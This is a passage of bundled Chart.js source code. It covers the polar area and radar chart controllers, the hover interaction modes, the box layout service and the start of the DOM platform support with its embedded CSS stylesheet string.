      var opts = chart.options;
      var minSize = Math.min(
        chartArea.right - chartArea.left,
        chartArea.bottom - chartArea.top
      );

      chart.outerRadius = Math.max(minSize / 2, 0);
      chart.innerRadius = Math.max(
        opts.cutoutPercentage
          ? (chart.outerRadius / 100) * opts.cutoutPercentage
          : 1,
        0
      );
      chart.radiusLength =
        (chart.outerRadius - chart.innerRadius) /
        chart.getVisibleDatasetCount();

      me.outerRadius = chart.outerRadius - chart.radiusLength * me.index;
      me.innerRadius = me.outerRadius - chart.radiusLength;
    },

    updateElement: function (arc, index, reset) {
      var me = this;
      var chart = me.chart;
      var dataset = me.getDataset();
      var opts = chart.options;
      var animationOpts = opts.animation;
      var scale = chart.scale;
      var labels = chart.data.labels;

      var centerX = scale.xCenter;
      var centerY = scale.yCenter;

      // var negHalfPI = -0.5 * Math.PI;
      var datasetStartAngle = opts.startAngle;
      var distance = arc.hidden
        ? 0
        : scale.getDistanceFromCenterForValue(dataset.data[index]);
      var startAngle = me._starts[index];
      var endAngle = startAngle + (arc.hidden ? 0 : me._angles[index]);

      var resetRadius = animationOpts.animateScale
        ? 0
        : scale.getDistanceFromCenterForValue(dataset.data[index]);
      var options = arc._options || {};

      helpers$1.extend(arc, {
        // Utility
        _datasetIndex: me.index,
        _index: index,
        _scale: scale,

        // Desired view properties
        _model: {
          backgroundColor: options.backgroundColor,
          borderColor: options.borderColor,
          borderWidth: options.borderWidth,
          borderAlign: options.borderAlign,
          x: centerX,
          y: centerY,
          innerRadius: 0,
          outerRadius: reset ? resetRadius : distance,
          startAngle:
            reset && animationOpts.animateRotate
              ? datasetStartAngle
              : startAngle,
          endAngle:
            reset && animationOpts.animateRotate ? datasetStartAngle : endAngle,
          label: helpers$1.valueAtIndexOrDefault(labels, index, labels[index]),
        },
      });

      arc.pivot();
    },

    countVisibleElements: function () {
      var dataset = this.getDataset();
      var meta = this.getMeta();
      var count = 0;

      helpers$1.each(meta.data, function (element, index) {
        if (!isNaN(dataset.data[index]) && !element.hidden) {
          count++;
        }
      });

      return count;
    },

    /**
     * @protected
     */
    setHoverStyle: function (arc) {
      var model = arc._model;
      var options = arc._options;
      var getHoverColor = helpers$1.getHoverColor;
      var valueOrDefault = helpers$1.valueOrDefault;

      arc.$previousStyle = {
        backgroundColor: model.backgroundColor,
        borderColor: model.borderColor,
        borderWidth: model.borderWidth,
      };

      model.backgroundColor = valueOrDefault(
        options.hoverBackgroundColor,
        getHoverColor(options.backgroundColor)
      );
      model.borderColor = valueOrDefault(
        options.hoverBorderColor,
        getHoverColor(options.borderColor)
      );
      model.borderWidth = valueOrDefault(
        options.hoverBorderWidth,
        options.borderWidth
      );
    },

    /**
     * @private
     */
    _computeAngle: function (index) {
      var me = this;
      var count = this.getMeta().count;
      var dataset = me.getDataset();
      var meta = me.getMeta();

      if (isNaN(dataset.data[index]) || meta.data[index].hidden) {
        return 0;
      }

      // Scriptable options
      var context = {
        chart: me.chart,
        dataIndex: index,
        dataset: dataset,
        datasetIndex: me.index,
      };

      return resolve$3(
        [me.chart.options.elements.arc.angle, (2 * Math.PI) / count],
        context,
        index
      );
    },
  });

  core_defaults._set("pie", helpers$1.clone(core_defaults.doughnut));
  core_defaults._set("pie", {
    cutoutPercentage: 0,
  });

  // Pie charts are Doughnut chart with different defaults
  var controller_pie = controller_doughnut;

  var valueOrDefault$7 = helpers$1.valueOrDefault;

  core_defaults._set("radar", {
    spanGaps: false,
    scale: {
      type: "radialLinear",
    },
    elements: {
      line: {
        fill: "start",
        tension: 0, // no bezier in radar
      },
    },
  });

  var controller_radar = core_datasetController.extend({
    datasetElementType: elements.Line,

    dataElementType: elements.Point,

    linkScales: helpers$1.noop,

    /**
     * @private
     */
    _datasetElementOptions: [
      "backgroundColor",
      "borderWidth",
      "borderColor",
      "borderCapStyle",
      "borderDash",
      "borderDashOffset",
      "borderJoinStyle",
      "fill",
    ],

    /**
     * @private
     */
    _dataElementOptions: {
      backgroundColor: "pointBackgroundColor",
      borderColor: "pointBorderColor",
      borderWidth: "pointBorderWidth",
      hitRadius: "pointHitRadius",
      hoverBackgroundColor: "pointHoverBackgroundColor",
      hoverBorderColor: "pointHoverBorderColor",
      hoverBorderWidth: "pointHoverBorderWidth",
      hoverRadius: "pointHoverRadius",
      pointStyle: "pointStyle",
      radius: "pointRadius",
      rotation: "pointRotation",
    },

    /**
     * @private
     */
    _getIndexScaleId: function () {
      return this.chart.scale.id;
    },

    /**
     * @private
     */
    _getValueScaleId: function () {
      return this.chart.scale.id;
    },

    update: function (reset) {
      var me = this;
      var meta = me.getMeta();
      var line = meta.dataset;
      var points = meta.data || [];
      var scale = me.chart.scale;
      var config = me._config;
      var i, ilen;

      // Compatibility: If the properties are defined with only the old name, use those values
      if (config.tension !== undefined && config.lineTension === undefined) {
        config.lineTension = config.tension;
      }

      // Utility
      line._scale = scale;
      line._datasetIndex = me.index;
      // Data
      line._children = points;
      line._loop = true;
      // Model
      line._model = me._resolveDatasetElementOptions(line);

      line.pivot();

      // Update Points
      for (i = 0, ilen = points.length; i < ilen; ++i) {
        me.updateElement(points[i], i, reset);
      }

      // Update bezier control points
      me.updateBezierControlPoints();

      // Now pivot the point for animation
      for (i = 0, ilen = points.length; i < ilen; ++i) {
        points[i].pivot();
      }
    },

    updateElement: function (point, index, reset) {
      var me = this;
      var custom = point.custom || {};
      var dataset = me.getDataset();
      var scale = me.chart.scale;
      var pointPosition = scale.getPointPositionForValue(
        index,
        dataset.data[index]
      );
      var options = me._resolveDataElementOptions(point, index);
      var lineModel = me.getMeta().dataset._model;
      var x = reset ? scale.xCenter : pointPosition.x;
      var y = reset ? scale.yCenter : pointPosition.y;

      // Utility
      point._scale = scale;
      point._options = options;
      point._datasetIndex = me.index;
      point._index = index;

      // Desired view properties
      point._model = {
        x: x, // value not used in dataset scale, but we want a consistent API between scales
        y: y,
        skip: custom.skip || isNaN(x) || isNaN(y),
        // Appearance
        radius: options.radius,
        pointStyle: options.pointStyle,
        rotation: options.rotation,
        backgroundColor: options.backgroundColor,
        borderColor: options.borderColor,
        borderWidth: options.borderWidth,
        tension: valueOrDefault$7(
          custom.tension,
          lineModel ? lineModel.tension : 0
        ),

        // Tooltip
        hitRadius: options.hitRadius,
      };
    },

    /**
     * @private
     */
    _resolveDatasetElementOptions: function () {
      var me = this;
      var config = me._config;
      var options = me.chart.options;
      var values =
        core_datasetController.prototype._resolveDatasetElementOptions.apply(
          me,
          arguments
        );

      values.spanGaps = valueOrDefault$7(config.spanGaps, options.spanGaps);
      values.tension = valueOrDefault$7(
        config.lineTension,
        options.elements.line.tension
      );

      return values;
    },

    updateBezierControlPoints: function () {
      var me = this;
      var meta = me.getMeta();
      var area = me.chart.chartArea;
      var points = meta.data || [];
      var i, ilen, model, controlPoints;

      // Only consider points that are drawn in case the spanGaps option is used
      if (meta.dataset._model.spanGaps) {
        points = points.filter(function (pt) {
          return !pt._model.skip;
        });
      }

      function capControlPoint(pt, min, max) {
        return Math.max(Math.min(pt, max), min);
      }

      for (i = 0, ilen = points.length; i < ilen; ++i) {
        model = points[i]._model;
        controlPoints = helpers$1.splineCurve(
          helpers$1.previousItem(points, i, true)._model,
          model,
          helpers$1.nextItem(points, i, true)._model,
          model.tension
        );

        // Prevent the bezier going outside of the bounds of the graph
        model.controlPointPreviousX = capControlPoint(
          controlPoints.previous.x,
          area.left,
          area.right
        );
        model.controlPointPreviousY = capControlPoint(
          controlPoints.previous.y,
          area.top,
          area.bottom
        );
        model.controlPointNextX = capControlPoint(
          controlPoints.next.x,
          area.left,
          area.right
        );
        model.controlPointNextY = capControlPoint(
          controlPoints.next.y,
          area.top,
          area.bottom
        );
      }
    },

    setHoverStyle: function (point) {
      var model = point._model;
      var options = point._options;
      var getHoverColor = helpers$1.getHoverColor;

      point.$previousStyle = {
        backgroundColor: model.backgroundColor,
        borderColor: model.borderColor,
        borderWidth: model.borderWidth,
        radius: model.radius,
      };

      model.backgroundColor = valueOrDefault$7(
        options.hoverBackgroundColor,
        getHoverColor(options.backgroundColor)
      );
      model.borderColor = valueOrDefault$7(
        options.hoverBorderColor,
        getHoverColor(options.borderColor)
      );
      model.borderWidth = valueOrDefault$7(
        options.hoverBorderWidth,
        options.borderWidth
      );
      model.radius = valueOrDefault$7(options.hoverRadius, options.radius);
    },
  });

  core_defaults._set("scatter", {
    hover: {
      mode: "single",
    },

    scales: {
      xAxes: [
        {
          id: "x-axis-1", // need an ID so datasets can reference the scale
          type: "linear", // scatter should not use a category axis
          position: "bottom",
        },
      ],
      yAxes: [
        {
          id: "y-axis-1",
          type: "linear",
          position: "left",
        },
      ],
    },

    tooltips: {
      callbacks: {
        title: function () {
          return ""; // doesn't make sense for scatter since data are formatted as a point
        },
        label: function (item) {
          return "(" + item.xLabel + ", " + item.yLabel + ")";
        },
      },
    },
  });

  core_defaults._set("global", {
    datasets: {
      scatter: {
        showLine: false,
      },
    },
  });

  // Scatter charts use line controllers
  var controller_scatter = controller_line;

  // NOTE export a map in which the key represents the controller type, not
  // the class, and so must be CamelCase in order to be correctly retrieved
  // by the controller in core.controller.js (`controllers[meta.type]`).

  var controllers = {
    bar: controller_bar,
    bubble: controller_bubble,
    doughnut: controller_doughnut,
    horizontalBar: controller_horizontalBar,
    line: controller_line,
    polarArea: controller_polarArea,
    pie: controller_pie,
    radar: controller_radar,
    scatter: controller_scatter,
  };

  /**
   * Helper function to get relative position for an event
   * @param {Event|IEvent} event - The event to get the position for
   * @param {Chart} chart - The chart
   * @returns {object} the event position
   */
  function getRelativePosition(e, chart) {
    if (e.native) {
      return {
        x: e.x,
        y: e.y,
      };
    }

    return helpers$1.getRelativePosition(e, chart);
  }

  /**
   * Helper function to traverse all of the visible elements in the chart
   * @param {Chart} chart - the chart
   * @param {function} handler - the callback to execute for each visible item
   */
  function parseVisibleItems(chart, handler) {
    var metasets = chart._getSortedVisibleDatasetMetas();
    var metadata, i, j, ilen, jlen, element;

    for (i = 0, ilen = metasets.length; i < ilen; ++i) {
      metadata = metasets[i].data;
      for (j = 0, jlen = metadata.length; j < jlen; ++j) {
        element = metadata[j];
        if (!element._view.skip) {
          handler(element);
        }
      }
    }
  }

  /**
   * Helper function to get the items that intersect the event position
   * @param {ChartElement[]} items - elements to filter
   * @param {object} position - the point to be nearest to
   * @return {ChartElement[]} the nearest items
   */
  function getIntersectItems(chart, position) {
    var elements = [];

    parseVisibleItems(chart, function (element) {
      if (element.inRange(position.x, position.y)) {
        elements.push(element);
      }
    });

    return elements;
  }

  /**
   * Helper function to get the items nearest to the event position considering all visible items in teh chart
   * @param {Chart} chart - the chart to look at elements from
   * @param {object} position - the point to be nearest to
   * @param {boolean} intersect - if true, only consider items that intersect the position
   * @param {function} distanceMetric - function to provide the distance between points
   * @return {ChartElement[]} the nearest items
   */
  function getNearestItems(chart, position, intersect, distanceMetric) {
    var minDistance = Number.POSITIVE_INFINITY;
    var nearestItems = [];

    parseVisibleItems(chart, function (element) {
      if (intersect && !element.inRange(position.x, position.y)) {
        return;
      }

      var center = element.getCenterPoint();
      var distance = distanceMetric(position, center);
      if (distance < minDistance) {
        nearestItems = [element];
        minDistance = distance;
      } else if (distance === minDistance) {
        // Can have multiple items at the same distance in which case we sort by size
        nearestItems.push(element);
      }
    });

    return nearestItems;
  }

  /**
   * Get a distance metric function for two points based on the
   * axis mode setting
   * @param {string} axis - the axis mode. x|y|xy
   */
  function getDistanceMetricForAxis(axis) {
    var useX = axis.indexOf("x") !== -1;
    var useY = axis.indexOf("y") !== -1;

    return function (pt1, pt2) {
      var deltaX = useX ? Math.abs(pt1.x - pt2.x) : 0;
      var deltaY = useY ? Math.abs(pt1.y - pt2.y) : 0;
      return Math.sqrt(Math.pow(deltaX, 2) + Math.pow(deltaY, 2));
    };
  }

  function indexMode(chart, e, options) {
    var position = getRelativePosition(e, chart);
    // Default axis for index mode is 'x' to match old behaviour
    options.axis = options.axis || "x";
    var distanceMetric = getDistanceMetricForAxis(options.axis);
    var items = options.intersect
      ? getIntersectItems(chart, position)
      : getNearestItems(chart, position, false, distanceMetric);
    var elements = [];

    if (!items.length) {
      return [];
    }

    chart._getSortedVisibleDatasetMetas().forEach(function (meta) {
      var element = meta.data[items[0]._index];

      // don't count items that are skipped (null data)
      if (element && !element._view.skip) {
        elements.push(element);
      }
    });

    return elements;
  }

  /**
   * @interface IInteractionOptions
   */
  /**
   * If true, only consider items that intersect the point
   * @name IInterfaceOptions#boolean
   * @type Boolean
   */

  /**
   * Contains interaction related functions
   * @namespace Chart.Interaction
   */
  var core_interaction = {
    // Helper function for different modes
    modes: {
      single: function (chart, e) {
        var position = getRelativePosition(e, chart);
        var elements = [];

        parseVisibleItems(chart, function (element) {
          if (element.inRange(position.x, position.y)) {
            elements.push(element);
            return elements;
          }
        });

        return elements.slice(0, 1);
      },

      /**
       * @function Chart.Interaction.modes.label
       * @deprecated since version 2.4.0
       * @todo remove at version 3
       * @private
       */
      label: indexMode,

      /**
       * Returns items at the same index. If the options.intersect parameter is true, we only return items if we intersect something
       * If the options.intersect mode is false, we find the nearest item and return the items at the same index as that item
       * @function Chart.Interaction.modes.index
       * @since v2.4.0
       * @param {Chart} chart - the chart we are returning items from
       * @param {Event} e - the event we are find things at
       * @param {IInteractionOptions} options - options to use during interaction
       * @return {Chart.Element[]} Array of elements that are under the point. If none are found, an empty array is returned
       */
      index: indexMode,

      /**
       * Returns items in the same dataset. If the options.intersect parameter is true, we only return items if we intersect something
       * If the options.intersect is false, we find the nearest item and return the items in that dataset
       * @function Chart.Interaction.modes.dataset
       * @param {Chart} chart - the chart we are returning items from
       * @param {Event} e - the event we are find things at
       * @param {IInteractionOptions} options - options to use during interaction
       * @return {Chart.Element[]} Array of elements that are under the point. If none are found, an empty array is returned
       */
      dataset: function (chart, e, options) {
        var position = getRelativePosition(e, chart);
        options.axis = options.axis || "xy";
        var distanceMetric = getDistanceMetricForAxis(options.axis);
        var items = options.intersect
          ? getIntersectItems(chart, position)
          : getNearestItems(chart, position, false, distanceMetric);

        if (items.length > 0) {
          items = chart.getDatasetMeta(items[0]._datasetIndex).data;
        }

        return items;
      },

      /**
       * @function Chart.Interaction.modes.x-axis
       * @deprecated since version 2.4.0. Use index mode and intersect == true
       * @todo remove at version 3
       * @private
       */
      "x-axis": function (chart, e) {
        return indexMode(chart, e, { intersect: false });
      },

      /**
       * Point mode returns all elements that hit test based on the event position
       * of the event
       * @function Chart.Interaction.modes.intersect
       * @param {Chart} chart - the chart we are returning items from
       * @param {Event} e - the event we are find things at
       * @return {Chart.Element[]} Array of elements that are under the point. If none are found, an empty array is returned
       */
      point: function (chart, e) {
        var position = getRelativePosition(e, chart);
        return getIntersectItems(chart, position);
      },

      /**
       * nearest mode returns the element closest to the point
       * @function Chart.Interaction.modes.intersect
       * @param {Chart} chart - the chart we are returning items from
       * @param {Event} e - the event we are find things at
       * @param {IInteractionOptions} options - options to use
       * @return {Chart.Element[]} Array of elements that are under the point. If none are found, an empty array is returned
       */
      nearest: function (chart, e, options) {
        var position = getRelativePosition(e, chart);
        options.axis = options.axis || "xy";
        var distanceMetric = getDistanceMetricForAxis(options.axis);
        return getNearestItems(
          chart,
          position,
          options.intersect,
          distanceMetric
        );
      },

      /**
       * x mode returns the elements that hit-test at the current x coordinate
       * @function Chart.Interaction.modes.x
       * @param {Chart} chart - the chart we are returning items from
       * @param {Event} e - the event we are find things at
       * @param {IInteractionOptions} options - options to use
       * @return {Chart.Element[]} Array of elements that are under the point. If none are found, an empty array is returned
       */
      x: function (chart, e, options) {
        var position = getRelativePosition(e, chart);
        var items = [];
        var intersectsItem = false;

        parseVisibleItems(chart, function (element) {
          if (element.inXRange(position.x)) {
            items.push(element);
          }

          if (element.inRange(position.x, position.y)) {
            intersectsItem = true;
          }
        });

        // If we want to trigger on an intersect and we don't have any items
        // that intersect the position, return nothing
        if (options.intersect && !intersectsItem) {
          items = [];
        }
        return items;
      },

      /**
       * y mode returns the elements that hit-test at the current y coordinate
       * @function Chart.Interaction.modes.y
       * @param {Chart} chart - the chart we are returning items from
       * @param {Event} e - the event we are find things at
       * @param {IInteractionOptions} options - options to use
       * @return {Chart.Element[]} Array of elements that are under the point. If none are found, an empty array is returned
       */
      y: function (chart, e, options) {
        var position = getRelativePosition(e, chart);
        var items = [];
        var intersectsItem = false;

        parseVisibleItems(chart, function (element) {
          if (element.inYRange(position.y)) {
            items.push(element);
          }

          if (element.inRange(position.x, position.y)) {
            intersectsItem = true;
          }
        });

        // If we want to trigger on an intersect and we don't have any items
        // that intersect the position, return nothing
        if (options.intersect && !intersectsItem) {
          items = [];
        }
        return items;
      },
    },
  };

  var extend = helpers$1.extend;

  function filterByPosition(array, position) {
    return helpers$1.where(array, function (v) {
      return v.pos === position;
    });
  }

  function sortByWeight(array, reverse) {
    return array.sort(function (a, b) {
      var v0 = reverse ? b : a;
      var v1 = reverse ? a : b;
      return v0.weight === v1.weight
        ? v0.index - v1.index
        : v0.weight - v1.weight;
    });
  }

  function wrapBoxes(boxes) {
    var layoutBoxes = [];
    var i, ilen, box;

    for (i = 0, ilen = (boxes || []).length; i < ilen; ++i) {
      box = boxes[i];
      layoutBoxes.push({
        index: i,
        box: box,
        pos: box.position,
        horizontal: box.isHorizontal(),
        weight: box.weight,
      });
    }
    return layoutBoxes;
  }

  function setLayoutDims(layouts, params) {
    var i, ilen, layout;
    for (i = 0, ilen = layouts.length; i < ilen; ++i) {
      layout = layouts[i];
      // store width used instead of chartArea.w in fitBoxes
      layout.width = layout.horizontal
        ? layout.box.fullWidth && params.availableWidth
        : params.vBoxMaxWidth;
      // store height used instead of chartArea.h in fitBoxes
      layout.height = layout.horizontal && params.hBoxMaxHeight;
    }
  }

  function buildLayoutBoxes(boxes) {
    var layoutBoxes = wrapBoxes(boxes);
    var left = sortByWeight(filterByPosition(layoutBoxes, "left"), true);
    var right = sortByWeight(filterByPosition(layoutBoxes, "right"));
    var top = sortByWeight(filterByPosition(layoutBoxes, "top"), true);
    var bottom = sortByWeight(filterByPosition(layoutBoxes, "bottom"));

    return {
      leftAndTop: left.concat(top),
      rightAndBottom: right.concat(bottom),
      chartArea: filterByPosition(layoutBoxes, "chartArea"),
      vertical: left.concat(right),
      horizontal: top.concat(bottom),
    };
  }

  function getCombinedMax(maxPadding, chartArea, a, b) {
    return (
      Math.max(maxPadding[a], chartArea[a]) +
      Math.max(maxPadding[b], chartArea[b])
    );
  }

  function updateDims(chartArea, params, layout) {
    var box = layout.box;
    var maxPadding = chartArea.maxPadding;
    var newWidth, newHeight;

    if (layout.size) {
      // this layout was already counted for, lets first reduce old size
      chartArea[layout.pos] -= layout.size;
    }
    layout.size = layout.horizontal ? box.height : box.width;
    chartArea[layout.pos] += layout.size;

    if (box.getPadding) {
      var boxPadding = box.getPadding();
      maxPadding.top = Math.max(maxPadding.top, boxPadding.top);
      maxPadding.left = Math.max(maxPadding.left, boxPadding.left);
      maxPadding.bottom = Math.max(maxPadding.bottom, boxPadding.bottom);
      maxPadding.right = Math.max(maxPadding.right, boxPadding.right);
    }

    newWidth =
      params.outerWidth -
      getCombinedMax(maxPadding, chartArea, "left", "right");
    newHeight =
      params.outerHeight -
      getCombinedMax(maxPadding, chartArea, "top", "bottom");

    if (newWidth !== chartArea.w || newHeight !== chartArea.h) {
      chartArea.w = newWidth;
      chartArea.h = newHeight;

      // return true if chart area changed in layout's direction
      var sizes = layout.horizontal
        ? [newWidth, chartArea.w]
        : [newHeight, chartArea.h];
      return sizes[0] !== sizes[1] && (!isNaN(sizes[0]) || !isNaN(sizes[1]));
    }
  }

  function handleMaxPadding(chartArea) {
    var maxPadding = chartArea.maxPadding;

    function updatePos(pos) {
      var change = Math.max(maxPadding[pos] - chartArea[pos], 0);
      chartArea[pos] += change;
      return change;
    }
    chartArea.y += updatePos("top");
    chartArea.x += updatePos("left");
    updatePos("right");
    updatePos("bottom");
  }

  function getMargins(horizontal, chartArea) {
    var maxPadding = chartArea.maxPadding;

    function marginForPositions(positions) {
      var margin = { left: 0, top: 0, right: 0, bottom: 0 };
      positions.forEach(function (pos) {
        margin[pos] = Math.max(chartArea[pos], maxPadding[pos]);
      });
      return margin;
    }

    return horizontal
      ? marginForPositions(["left", "right"])
      : marginForPositions(["top", "bottom"]);
  }

  function fitBoxes(boxes, chartArea, params) {
    var refitBoxes = [];
    var i, ilen, layout, box, refit, changed;

    for (i = 0, ilen = boxes.length; i < ilen; ++i) {
      layout = boxes[i];
      box = layout.box;

      box.update(
        layout.width || chartArea.w,
        layout.height || chartArea.h,
        getMargins(layout.horizontal, chartArea)
      );
      if (updateDims(chartArea, params, layout)) {
        changed = true;
        if (refitBoxes.length) {
          // Dimensions changed and there were non full width boxes before this
          // -> we have to refit those
          refit = true;
        }
      }
      if (!box.fullWidth) {
        // fullWidth boxes don't need to be re-fitted in any case
        refitBoxes.push(layout);
      }
    }

    return refit ? fitBoxes(refitBoxes, chartArea, params) || changed : changed;
  }

  function placeBoxes(boxes, chartArea, params) {
    var userPadding = params.padding;
    var x = chartArea.x;
    var y = chartArea.y;
    var i, ilen, layout, box;

    for (i = 0, ilen = boxes.length; i < ilen; ++i) {
      layout = boxes[i];
      box = layout.box;
      if (layout.horizontal) {
        box.left = box.fullWidth ? userPadding.left : chartArea.left;
        box.right = box.fullWidth
          ? params.outerWidth - userPadding.right
          : chartArea.left + chartArea.w;
        box.top = y;
        box.bottom = y + box.height;
        box.width = box.right - box.left;
        y = box.bottom;
      } else {
        box.left = x;
        box.right = x + box.width;
        box.top = chartArea.top;
        box.bottom = chartArea.top + chartArea.h;
        box.height = box.bottom - box.top;
        x = box.right;
      }
    }

    chartArea.x = x;
    chartArea.y = y;
  }

  core_defaults._set("global", {
    layout: {
      padding: {
        top: 0,
        right: 0,
        bottom: 0,
        left: 0,
      },
    },
  });

  /**
   * @interface ILayoutItem
   * @prop {string} position - The position of the item in the chart layout. Possible values are
   * 'left', 'top', 'right', 'bottom', and 'chartArea'
   * @prop {number} weight - The weight used to sort the item. Higher weights are further away from the chart area
   * @prop {boolean} fullWidth - if true, and the item is horizontal, then push vertical boxes down
   * @prop {function} isHorizontal - returns true if the layout item is horizontal (ie. top or bottom)
   * @prop {function} update - Takes two parameters: width and height. Returns size of item
   * @prop {function} getPadding -  Returns an object with padding on the edges
   * @prop {number} width - Width of item. Must be valid after update()
   * @prop {number} height - Height of item. Must be valid after update()
   * @prop {number} left - Left edge of the item. Set by layout system and cannot be used in update
   * @prop {number} top - Top edge of the item. Set by layout system and cannot be used in update
   * @prop {number} right - Right edge of the item. Set by layout system and cannot be used in update
   * @prop {number} bottom - Bottom edge of the item. Set by layout system and cannot be used in update
   */

  // The layout service is very self explanatory.  It's responsible for the layout within a chart.
  // Scales, Legends and Plugins all rely on the layout service and can easily register to be placed anywhere they need
  // It is this service's responsibility of carrying out that layout.
  var core_layouts = {
    defaults: {},

    /**
     * Register a box to a chart.
     * A box is simply a reference to an object that requires layout. eg. Scales, Legend, Title.
     * @param {Chart} chart - the chart to use
     * @param {ILayoutItem} item - the item to add to be layed out
     */
    addBox: function (chart, item) {
      if (!chart.boxes) {
        chart.boxes = [];
      }

      // initialize item with default values
      item.fullWidth = item.fullWidth || false;
      item.position = item.position || "top";
      item.weight = item.weight || 0;
      item._layers =
        item._layers ||
        function () {
          return [
            {
              z: 0,
              draw: function () {
                item.draw.apply(item, arguments);
              },
            },
          ];
        };

      chart.boxes.push(item);
    },

    /**
     * Remove a layoutItem from a chart
     * @param {Chart} chart - the chart to remove the box from
     * @param {ILayoutItem} layoutItem - the item to remove from the layout
     */
    removeBox: function (chart, layoutItem) {
      var index = chart.boxes ? chart.boxes.indexOf(layoutItem) : -1;
      if (index !== -1) {
        chart.boxes.splice(index, 1);
      }
    },

    /**
     * Sets (or updates) options on the given `item`.
     * @param {Chart} chart - the chart in which the item lives (or will be added to)
     * @param {ILayoutItem} item - the item to configure with the given options
     * @param {object} options - the new item options.
     */
    configure: function (chart, item, options) {
      var props = ["fullWidth", "position", "weight"];
      var ilen = props.length;
      var i = 0;
      var prop;

      for (; i < ilen; ++i) {
        prop = props[i];
        if (options.hasOwnProperty(prop)) {
          item[prop] = options[prop];
        }
      }
    },

    /**
     * Fits boxes of the given chart into the given size by having each box measure itself
     * then running a fitting algorithm
     * @param {Chart} chart - the chart
     * @param {number} width - the width to fit into
     * @param {number} height - the height to fit into
     */
    update: function (chart, width, height) {
      if (!chart) {
        return;
      }

      var layoutOptions = chart.options.layout || {};
      var padding = helpers$1.options.toPadding(layoutOptions.padding);

      var availableWidth = width - padding.width;
      var availableHeight = height - padding.height;
      var boxes = buildLayoutBoxes(chart.boxes);
      var verticalBoxes = boxes.vertical;
      var horizontalBoxes = boxes.horizontal;

      // Essentially we now have any number of boxes on each of the 4 sides.
      // Our canvas looks like the following.
      // The areas L1 and L2 are the left axes. R1 is the right axis, T1 is the top axis and
      // B1 is the bottom axis
      // There are also 4 quadrant-like locations (left to right instead of clockwise) reserved for chart overlays
      // These locations are single-box locations only, when trying to register a chartArea location that is already taken,
      // an error will be thrown.
      //
      // |----------------------------------------------------|
      // |                  T1 (Full Width)                   |
      // |----------------------------------------------------|
      // |    |    |                 T2                  |    |
      // |    |----|-------------------------------------|----|
      // |    |    | C1 |                           | C2 |    |
      // |    |    |----|                           |----|    |
      // |    |    |                                     |    |
      // | L1 | L2 |           ChartArea (C0)            | R1 |
      // |    |    |                                     |    |
      // |    |    |----|                           |----|    |
      // |    |    | C3 |                           | C4 |    |
      // |    |----|-------------------------------------|----|
      // |    |    |                 B1                  |    |
      // |----------------------------------------------------|
      // |                  B2 (Full Width)                   |
      // |----------------------------------------------------|
      //

      var params = Object.freeze({
        outerWidth: width,
        outerHeight: height,
        padding: padding,
        availableWidth: availableWidth,
        vBoxMaxWidth: availableWidth / 2 / verticalBoxes.length,
        hBoxMaxHeight: availableHeight / 2,
      });
      var chartArea = extend(
        {
          maxPadding: extend({}, padding),
          w: availableWidth,
          h: availableHeight,
          x: padding.left,
          y: padding.top,
        },
        padding
      );

      setLayoutDims(verticalBoxes.concat(horizontalBoxes), params);

      // First fit vertical boxes
      fitBoxes(verticalBoxes, chartArea, params);

      // Then fit horizontal boxes
      if (fitBoxes(horizontalBoxes, chartArea, params)) {
        // if the area changed, re-fit vertical boxes
        fitBoxes(verticalBoxes, chartArea, params);
      }

      handleMaxPadding(chartArea);

      // Finally place the boxes to correct coordinates
      placeBoxes(boxes.leftAndTop, chartArea, params);

      // Move to opposite side of chart
      chartArea.x += chartArea.w;
      chartArea.y += chartArea.h;

      placeBoxes(boxes.rightAndBottom, chartArea, params);

      chart.chartArea = {
        left: chartArea.left,
        top: chartArea.top,
        right: chartArea.left + chartArea.w,
        bottom: chartArea.top + chartArea.h,
      };

      // Finally update boxes in chartArea (radial scale for example)
      helpers$1.each(boxes.chartArea, function (layout) {
        var box = layout.box;
        extend(box, chart.chartArea);
        box.update(chartArea.w, chartArea.h);
      });
    },
  };

  /**
   * Platform fallback implementation (minimal).
   * @see https://github.com/chartjs/Chart.js/pull/4591#issuecomment-319575939
   */

  var platform_basic = {
    acquireContext: function (item) {
      if (item && item.canvas) {
        // Support for any object associated to a canvas (including a context2d)
        item = item.canvas;
      }

      return (item && item.getContext("2d")) || null;
    },
  };

  var platform_dom =
    "/*\r\n * DOM element rendering detection\r\n * https://davidwalsh.name/detect-node-insertion\r\n */\r\n@keyframes chartjs-render-animation {\r\n\tfrom { opacity: 0.99; }\r\n\tto { opacity: 1; }\r\n}\r\n\r\n.chartjs-render-monitor {\r\n\tanimation: chartjs-render-animation 0.001s;\r\n}\r\n\r\n/*\r\n * DOM element resizing detection\r\n * https://github.com/marcj/css-element-queries\r\n */\r\n.chartjs-size-monitor,\r\n.chartjs-size-monitor-expand,\r\n.chartjs-size-monitor-shrink {\r\n\tposition: absolute;\r\n\tdirection: ltr;\r\n\tleft: 0;\r\n\ttop: 0;\r\n\tright: 0;\r\n\tbottom: 0;\r\n\toverflow: hidden;\r\n\tpointer-events: none;\r\n\tvisibility: hidden;\r\n\tz-index: -1;\r\n}\r\n\r\n.chartjs-size-monitor-expand > div {\r\n\tposition: absolute;\r\n\twidth: 1000000px;\r\n\theight: 1000000px;\r\n\tleft: 0;\r\n\ttop: 0;\r\n}\r\n\r\n.chartjs-size-monitor-shrink > div {\r\n\tposition: absolute;\r\n\twidth: 200%;\r\n\theight: 200%;\r\n\tleft: 0;\r\n\ttop: 0;\r\n}\r\n";

  var platform_dom$1 = /*#__PURE__*/ Object.freeze({
    __proto__: null,
    default: platform_dom,
  });

  var stylesheet = getCjsExportFromNamespace(platform_dom$1);

  var EXPANDO_KEY = "$chartjs";
  var CSS_PREFIX = "chartjs-";
  var CSS_SIZE_MONITOR = CSS_PREFIX + "size-monitor";
  var CSS_RENDER_MONITOR = CSS_PREFIX + "render-monitor";
  var CSS_RENDER_ANIMATION = CSS_PREFIX + "render-animation";
  var ANIMATION_START_EVENTS = ["animationstart", "webkitAnimationStart"];

  /**
   * DOM event types -> Chart.js event types.
   * Note: only events with different types are mapped.
   * @see https://developer.mozilla.org/en-US/docs/Web/Events
   */
  var EVENT_TYPES = {
    touchstart: "mousedown",
    touchmove: "mousemove",
    touchend: "mouseup",
    pointerenter: "mouseenter",
    pointerdown: "mousedown",
    pointermove: "mousemove",
    pointerup: "mouseup",
    pointerleave: "mouseout",
    pointerout: "mouseout",
  };

  /**
   * The "used" size is the final value of a dimension property after all calculations have
   * been performed. This method uses the computed style of `element` but returns undefined
   * if the computed style is not expressed in pixels. That can happen in some cases where
   * `element` has a size relative to its parent and this last one is not yet displayed,
   * for example because of `display: none` on a parent node.
   * @see https://developer.mozilla.org/en-US/docs/Web/CSS/used_value
